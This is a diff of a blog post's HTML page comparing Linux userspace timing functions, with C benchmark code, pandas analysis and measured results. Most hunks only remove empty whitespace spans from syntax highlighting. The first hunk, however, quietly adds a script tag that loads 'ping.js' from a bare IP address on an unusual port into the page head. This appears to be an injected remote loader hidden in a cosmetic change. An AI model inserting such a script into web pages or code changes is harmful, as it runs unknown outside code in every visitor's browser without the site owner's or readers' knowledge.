@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -86,43 +88,43 @@ High Precision Timers (userspace)
 <p class="subtitle">
 February 27, 2021
 </p>
-<p>You want to measure the time that it takes <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span><span class="w"></span></span></code> to run so you do the following:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">experiment</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="n">foo</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">();</span><span class="w"></span>
+<p>You want to measure the time that it takes <code><span class="highlight-candombe-inline"><span class="n">foo</span><span class="p">()</span></span></code> to run so you do the following:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">experiment</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">begin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">();</span>
+<span class="w">    </span><span class="n">foo</span><span class="p">();</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">now</span><span class="p">();</span>
 
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Elapsed: %lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">begin</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Elapsed: %lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">begin</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>The question is, what <code><span class="highlight-candombe-inline"><span class="n">now</span><span class="p">()</span><span class="w"></span></span></code> function you would use?<!--more--></p>
+<p>The question is, what <code><span class="highlight-candombe-inline"><span class="n">now</span><span class="p">()</span></span></code> function you would use?<!--more--></p>
 <p><label for='CllvdSBjb3VsZCByZWFkIGEgQ1BVIHJlZ2lzdGVyIHRoYXQgaW1wbGVtZW50cyB0aGUgY2xvY2sgaW4gaGFyZHdhcmUuCkJld2FyZSwgaG93ZXZlciwgdGhhdCB0aGUgcmVhZCBtYXkgbm90IGJlIGNoZWFwIGFuZCB0aGUgY2xvY2sKbWF5IG5vdCBoYXZlIHRoZSBwcmVjaXNpb24gdGhhdCB5b3UgbmVlZC4KCkFsc28sIHRoZSByZWdpc3RlciBtYXkgYmUgcGVyIENQVTogdG8gbWFrZSBpdCB3b3JrIHlvdSBuZWVkIHRvCmVuc3VyZSB0aGF0IGBleHBlcmltZW50KClgIGRvZXMgbm90IG1pZ3JhdGUgdG8gYW5vdGhlciBDUFUuCgpTZWUgW2xpYnBmbTRdKGh0dHBzOi8vZ2l0aHViLmNvbS93Y29oZW4vbGlicGZtNCkuCiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='CllvdSBjb3VsZCByZWFkIGEgQ1BVIHJlZ2lzdGVyIHRoYXQgaW1wbGVtZW50cyB0aGUgY2xvY2sgaW4gaGFyZHdhcmUuCkJld2FyZSwgaG93ZXZlciwgdGhhdCB0aGUgcmVhZCBtYXkgbm90IGJlIGNoZWFwIGFuZCB0aGUgY2xvY2sKbWF5IG5vdCBoYXZlIHRoZSBwcmVjaXNpb24gdGhhdCB5b3UgbmVlZC4KCkFsc28sIHRoZSByZWdpc3RlciBtYXkgYmUgcGVyIENQVTogdG8gbWFrZSBpdCB3b3JrIHlvdSBuZWVkIHRvCmVuc3VyZSB0aGF0IGBleHBlcmltZW50KClgIGRvZXMgbm90IG1pZ3JhdGUgdG8gYW5vdGhlciBDUFUuCgpTZWUgW2xpYnBmbTRdKGh0dHBzOi8vZ2l0aHViLmNvbS93Y29oZW4vbGlicGZtNCkuCiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
 You could read a CPU register that implements the clock in hardware. Beware, however, that the read may not be cheap and the clock may not have the precision that you need.
 <br /><br />
-Also, the register may be per CPU: to make it work you need to ensure that <code><span class="highlight-candombe-inline"><span class="n">experiment</span><span class="p">()</span><span class="w"></span></span></code> does not migrate to another CPU.
+Also, the register may be per CPU: to make it work you need to ensure that <code><span class="highlight-candombe-inline"><span class="n">experiment</span><span class="p">()</span></span></code> does not migrate to another CPU.
 <br /><br />
 See <a href="https://github.com/wcohen/libpfm4">libpfm4</a>.
 </span></p>
 <p>There are some options available:</p>
 <ul>
-<li><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span><span class="w"></span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">.</span><span class="n">h</span><span class="w"></span></span></code></li>
-<li><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">time</span><span class="p">.</span><span class="n">h</span><span class="w"></span></span></code></li>
-<li><code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span><span class="w"></span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">time</span><span class="p">.</span><span class="n">h</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">resource</span><span class="p">.</span><span class="n">h</span><span class="w"></span></span></code></li>
-<li><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">.</span><span class="n">h</span><span class="w"></span></span></code></li>
+<li><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">.</span><span class="n">h</span></span></code></li>
+<li><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">time</span><span class="p">.</span><span class="n">h</span></span></code></li>
+<li><code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">time</span><span class="p">.</span><span class="n">h</span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">sys</span><span class="o">/</span><span class="n">resource</span><span class="p">.</span><span class="n">h</span></span></code></li>
+<li><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code> from <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">.</span><span class="n">h</span></span></code></li>
 </ul>
 <p>However not all of them are as suitable for the task as they may seem.</p>
 <h2 id="test-escenario">Test escenario</h2>
 <p>The idea is to call a particular clock several times in a tight loop.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">rounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
-<span class="k">struct</span><span class="w"> </span><span class="nc">timespec</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">times1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">times1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">rounds</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">rounds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">timespec</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">times1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">times1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">rounds</span><span class="p">);</span>
 
-<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">rounds</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">clock_gettime</span><span class="p">(</span><span class="n">CLOCK_MONOTONIC</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
-<span class="n">print_nsec_resolution</span><span class="p">(</span><span class="n">rounds</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;mono&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">times1</span><span class="p">);</span><span class="w"></span>
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">rounds</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">clock_gettime</span><span class="p">(</span><span class="n">CLOCK_MONOTONIC</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="n">print_nsec_resolution</span><span class="p">(</span><span class="n">rounds</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;mono&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">times1</span><span class="p">);</span>
 </code></pre></div>
 
 <p><label for='CklmIHRoZSBjbG9jayBqdW1wcyAqYmFja3dhcmRzKiwgdGhpcyBmdW5jdGlvbiB3aWxsIHByaW50IGEgKmh1Z2UqCm51bWJlciBhbmQgbm90IGEgbmVnYXRpdmUgdmFsdWUuCiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
@@ -130,17 +132,17 @@ See <a href="https://github.com/wcohen/libpfm4">libpfm4</a>.
 <span class='marginnote'>
 If the clock jumps <em>backwards</em>, this function will print a <em>huge</em> number and not a negative value.
 </span></p>
-<p>The <code><span class="highlight-candombe-inline"><span class="n">print_</span><span class="o">*</span><span class="w"></span></span></code> functions will print the measurements normalized: no matter the clock’s resolution, the printed value will be in nanoseconds and to get comparable results the values are respect the first measurement.</p>
+<p>The <code><span class="highlight-candombe-inline"><span class="n">print_</span><span class="o">*</span></span></code> functions will print the measurements normalized: no matter the clock’s resolution, the printed value will be in nanoseconds and to get comparable results the values are respect the first measurement.</p>
 <p>In other words:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="kt">uint64_t</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">tv_sec</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000000000</span><span class="p">;</span><span class="w"> </span><span class="c1">// seconds as nanoseconds</span>
 <span class="n">ref</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">tv_nsec</span><span class="p">;</span><span class="w"> </span><span class="c1">// plus the nanoseconds</span>
 
-<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">rounds</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">tv_sec</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000000000</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="n">tmp</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">tv_nsec</span><span class="p">;</span><span class="w"></span>
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">rounds</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">tv_sec</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000000000</span><span class="p">;</span>
+<span class="w">    </span><span class="n">tmp</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">times1</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">tv_nsec</span><span class="p">;</span>
 
-<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s %lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">category</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="o">-</span><span class="n">ref</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s %lu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">category</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="o">-</span><span class="n">ref</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>The full code can be found <a href="/assets/perf/timing/clocks.c">here</a>.</p>
@@ -154,7 +156,7 @@ The use of <code><span class="highlight-candombe-inline"><span class="n">dtype</
 This reduces by two orders of magnitud the memory usage (<code><span class="highlight-candombe-inline"><span class="n">d</span><span class="o">.</span><span class="n">memory_usage</span><span class="p">(</span><span class="kc">True</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span></span></code> to compare them). <a href="https://pandas.pydata.org/pandas-docs/stable/user_guide/scale.html">Pandas reference</a>
 </span></p>
 <p>Each line is prefixed with a string that labels the clock type.</p>
-<p>The output can be loaded with <code><span class="highlight-candombe-inline"><span class="n">pandas</span><span class="w"></span></span></code> as follows:</p>
+<p>The output can be loaded with <code><span class="highlight-candombe-inline"><span class="n">pandas</span></span></code> as follows:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">d</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span>
 <span class="o">...</span>         <span class="n">fname</span><span class="p">,</span>
@@ -173,9 +175,9 @@ This reduces by two orders of magnitud the memory usage (<code><span class="high
 
 <p>The full code can be found <a href="/assets/perf/timing/analyze.py">here</a>.</p>
 <p>Let’s review what we’ve got.</p>
-<h3 id="time"><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span><span class="w"></span></span></code></h3>
-<p><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span><span class="w"></span></span></code> has a resolution of a second, so it is a <em>no-go</em> to measure things of the order of the microsecond or less.</p>
-<p>But for completeness I tested <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span><span class="w"></span></span></code> anyways and what I found it was a surprise:</p>
+<h3 id="time"><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span></span></code></h3>
+<p><code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span></span></code> has a resolution of a second, so it is a <em>no-go</em> to measure things of the order of the microsecond or less.</p>
+<p>But for completeness I tested <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span></span></code> anyways and what I found it was a surprise:</p>
 <pre><code>Clock type: time
          tval
 count  9999.0
@@ -186,20 +188,20 @@ min       0.0
 50%       0.0
 75%       0.0
 max       0.0</code></pre>
-<p>If I run <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span><span class="w"></span></span></code> in tight <code><span class="highlight-candombe-inline"><span class="k">for</span><span class="w"></span></span></code> loop, it returns always the same value, no matter how many times the loop iterates.</p>
-<p>I thought that it was a bug but nope, when I run it with <code><span class="highlight-candombe-inline"><span class="n">gdb</span><span class="w"></span></span></code> it works as expected.</p>
+<p>If I run <code><span class="highlight-candombe-inline"><span class="n">time</span><span class="p">()</span></span></code> in tight <code><span class="highlight-candombe-inline"><span class="k">for</span></span></code> loop, it returns always the same value, no matter how many times the loop iterates.</p>
+<p>I thought that it was a bug but nope, when I run it with <code><span class="highlight-candombe-inline"><span class="n">gdb</span></span></code> it works as expected.</p>
 <p>Weird.</p>
-<h3 id="gettimeofday"><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code></h3>
+<h3 id="gettimeofday"><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code></h3>
 <p><label for='ClRoaXMgY2FuIGJlIGV4cGxhaW5lZCBkdWUgaXRzIGltcGxlbWVudGF0aW9uOiBpbnN0ZWFkIG9mIGRvaW5nIGEKc3lzY2FsbCwgYSBjYWxsIHRvIGBnZXR0aW1lb2ZkYXkoKWAgY2FsbHMgYSBzbmlwcGV0IG9mIGNvZGUgaW4gdXNlcgpzcGFjZS4KClNlZSBtb3JlIGFib3V0IFt2c3lzY2FsbCBhbmQgdkRTTyBoZXJlXShodHRwczovLzB4YXguZ2l0Ym9va3MuaW8vbGludXgtaW5zaWRlcy9jb250ZW50L1N5c0NhbGwvbGludXgtc3lzY2FsbC0zLmh0bWwpCiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='ClRoaXMgY2FuIGJlIGV4cGxhaW5lZCBkdWUgaXRzIGltcGxlbWVudGF0aW9uOiBpbnN0ZWFkIG9mIGRvaW5nIGEKc3lzY2FsbCwgYSBjYWxsIHRvIGBnZXR0aW1lb2ZkYXkoKWAgY2FsbHMgYSBzbmlwcGV0IG9mIGNvZGUgaW4gdXNlcgpzcGFjZS4KClNlZSBtb3JlIGFib3V0IFt2c3lzY2FsbCBhbmQgdkRTTyBoZXJlXShodHRwczovLzB4YXguZ2l0Ym9va3MuaW8vbGludXgtaW5zaWRlcy9jb250ZW50L1N5c0NhbGwvbGludXgtc3lzY2FsbC0zLmh0bWwpCiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-This can be explained due its implementation: instead of doing a syscall, a call to <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> calls a snippet of code in user space.
+This can be explained due its implementation: instead of doing a syscall, a call to <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> calls a snippet of code in user space.
 <br /><br />
 See more about <a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-3.html">vsyscall and vDSO here</a>
 </span></p>
-<p><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> shown the best performance: the worst time measured between two consecutive calls is just 2 microseconds, which it is twice the minimum resolution of the function.</p>
+<p><code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> shown the best performance: the worst time measured between two consecutive calls is just 2 microseconds, which it is twice the minimum resolution of the function.</p>
 <p>Fast but it is also super imprecise.</p>
-<p>More than 75% of the differences between two consecutive measurements are zero which means that <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> returns a cached value and it is updated very infrequently.</p>
+<p>More than 75% of the differences between two consecutive measurements are zero which means that <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> returns a cached value and it is updated very infrequently.</p>
 <pre><code>clock type: tofd
               tval
 count  9999.000000
@@ -210,11 +212,11 @@ min       0.000000
 50%       0.000000
 75%       0.000000
 max    2000.000000</code></pre>
-<p>In addition to its intrinsic imprecision, <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> is <strong>not guaranteed to be monotonically increasing</strong>. So you can see <em>jumps</em> to the future or event to the past.</p>
-<p>This is because <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> is in sync with external sources of time like NTP. The user may even change it running <code><span class="highlight-candombe-inline"><span class="n">date</span><span class="w"></span></span></code>.</p>
+<p>In addition to its intrinsic imprecision, <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> is <strong>not guaranteed to be monotonically increasing</strong>. So you can see <em>jumps</em> to the future or event to the past.</p>
+<p>This is because <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> is in sync with external sources of time like NTP. The user may even change it running <code><span class="highlight-candombe-inline"><span class="n">date</span></span></code>.</p>
 <p>Fast but not useful to measure differences of time.</p>
-<h3 id="getrusage"><code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span><span class="w"></span></span></code></h3>
-<p>Something similar happens with <code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span><span class="w"></span></span></code>: it is slightly slower than <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span><span class="w"></span></span></code> but it is still super fast (7 microseconds) but returns cached values (at least half of the times).</p>
+<h3 id="getrusage"><code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span></span></code></h3>
+<p>Something similar happens with <code><span class="highlight-candombe-inline"><span class="n">getrusage</span><span class="p">()</span></span></code>: it is slightly slower than <code><span class="highlight-candombe-inline"><span class="n">gettimeofday</span><span class="p">()</span></span></code> but it is still super fast (7 microseconds) but returns cached values (at least half of the times).</p>
 <pre><code>Clock type: ruse
               tval
 count  9999.000000
@@ -225,7 +227,7 @@ min       0.000000
 50%       0.000000
 75%    1000.000000
 max    7000.000000</code></pre>
-<h3 id="clock_gettime"><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code></h3>
+<h3 id="clock_gettime"><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code></h3>
 <p><label for='ClNlZSBhbHNvIHRoZSBbUEVQIDQxOF0oaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDQxOC8jdGltZS1tb25vdG9uaWMpLgogbWFyZ2lubm90ZXM=' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='ClNlZSBhbHNvIHRoZSBbUEVQIDQxOF0oaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDQxOC8jdGltZS1tb25vdG9uaWMpLgogbWFyZ2lubm90ZXM=' class='margin-toggle'/>
 <span class='marginnote'>
@@ -233,15 +235,15 @@ See also the <a href="https://www.python.org/dev/peps/pep-0418/#time-monotonic">
 </span></p>
 <p>The manpage describes four kind of clocks that may work:</p>
 <ul>
-<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code>: monotonic time but it may be affected by incremental changes done by <code><span class="highlight-candombe-inline"><span class="n">adjtime</span><span class="w"></span></span></code> or NTP.</li>
-<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC_RAW</span><span class="w"></span></span></code>: like <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code> but it is not affected by <code><span class="highlight-candombe-inline"><span class="n">adjtime</span><span class="w"></span></span></code> or NTP. Uses hardware-specific.</li>
-<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span><span class="w"></span></span></code>: per process clock that measures the CPU time for the process (among all the threads).</li>
-<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span><span class="w"></span></span></code>: per thread clock that measures the CPU time for that particular thread.</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code>: monotonic time but it may be affected by incremental changes done by <code><span class="highlight-candombe-inline"><span class="n">adjtime</span></span></code> or NTP.</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC_RAW</span></span></code>: like <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code> but it is not affected by <code><span class="highlight-candombe-inline"><span class="n">adjtime</span></span></code> or NTP. Uses hardware-specific.</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span></span></code>: per process clock that measures the CPU time for the process (among all the threads).</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span></span></code>: per thread clock that measures the CPU time for that particular thread.</li>
 </ul>
-<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code> is the only that returned values that make sense and <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code> is the winner.</p>
+<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span></span></code> is the only that returned values that make sense and <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span></span></code> is the winner.</p>
 <p>It has the smallest elapsed time (80 nanoseconds) and it has a dispersion of the values of few nanoseconds.</p>
 <p>This can be seen in the percentiles 80, 84, 85, 86 nanoseconds.</p>
-<p><code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span><span class="w"></span></span></code> are in the second place.</p>
+<p><code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span></span></code> and <code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span></span></code> are in the second place.</p>
 <pre><code>         MONOTONIC    MONOTONIC_RAW   PROCESS_CPUTIME    THREAD_CPUTIME
               tval             tval              tval              tval
 count  9999.000000      9999.000000       9999.000000       9999.000000
@@ -254,9 +256,9 @@ min      80.000000       709.000000        366.000000        358.000000
 max    8019.000000     13532.000000      17392.000000      17572.000000</code></pre>
 <p>In all the cases the clocks are quite stable and the outliers are probably due noise in the system.</p>
 <h2 id="conclusions">Conclusions</h2>
-<p><code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code> is the winner, at least in my 4.19 kernel, with a minimum delta of 80 to 86 nanoseconds.</p>
-<p>In second place <code><span class="highlight-candombe-inline"><span class="n">clock_gettime</span><span class="p">()</span><span class="w"></span></span></code> with <code><span class="highlight-candombe-inline"><span class="n">CLOCK_PROCESS_CPUTIME_ID</span><span class="w"></span></span></code> or <code><span class="highlight-candombe-inline"><span class="n">CLOCK_THREAD_CPUTIME_ID</span><span class="w"></span></span></code>. Good performance, roughly 4 or 5 times slower than <code><span class="highlight-candombe-inline"><span class="n">CLOCK_MONOTONIC</span><span class="w"></span></span></code>.</p>
